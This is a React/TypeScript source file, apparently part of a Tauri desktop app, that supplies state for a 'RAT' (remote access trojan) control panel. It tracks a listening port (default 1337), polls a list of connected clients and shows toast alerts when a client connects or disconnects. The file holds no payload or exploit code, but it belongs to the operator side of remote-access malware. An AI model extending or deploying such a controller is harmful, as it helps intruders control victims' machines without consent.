import React, { useState, useEffect } from "react";
import { RATContext } from "./RATContext";
import { invoke } from "@tauri-apps/api/tauri";
import { listen } from "@tauri-apps/api/event";
import toast from "react-hot-toast";
import { RATClient, RATProviderProps } from "../../types";

export const RATProvider: React.FC<RATProviderProps> = ({ children }) => {
  const [port, setPort] = useState<string>("1337");
  const [running, setRunning] = useState<boolean>(false);
  const [clientList, setClientList] = useState<RATClient[]>([]);
  const [notificationClient, setNotificationClient] = useState<boolean>(true);

  const [selectedClient, setSelectedClient] = useState<string>("");

  async function fetchClients() {
    setClientList(await invoke("fetch_clients"));
  }

  useEffect(() => {
    if (!running) return;

    fetchClients();

    const interval = setInterval(fetchClients, 10000);

    return () => clearInterval(interval);
  }, [running]);

  const customToast = (icon: string, toast_message: string, bg: string) => {
    console.log(toast_message);
    return toast(toast_message, {
      icon,
      className: `${bg} !text-primary-content text-lg`,
    });
  };

  async function waitNotification(type: string) {
    const _ = listen(type, (event) => {
      let icon = type == "client_connected" ? "🤙" : "👋";
      let message = type == "client_connected" ? "connected" : "disconnected";
      let bg = type == "client_connected" ? "!bg-primary" : "!bg-neutral";
      let toast_message = `Client ${event.payload} has ${message}!`;

      customToast(icon, toast_message, bg);

      fetchClients();
    });
  }

  useEffect(() => {
    if (notificationClient) {
      waitNotification("client_connected");
      waitNotification("client_disconnected");
    }
  }, [notificationClient]);

  const RATdata = {
    port,
    setPort,
    fetchClients,
    setRunning,
    running,
    clientList,
    setSelectedClient,
    selectedClient,
  };

  return <RATContext.Provider value={RATdata}>{children}</RATContext.Provider>;
};
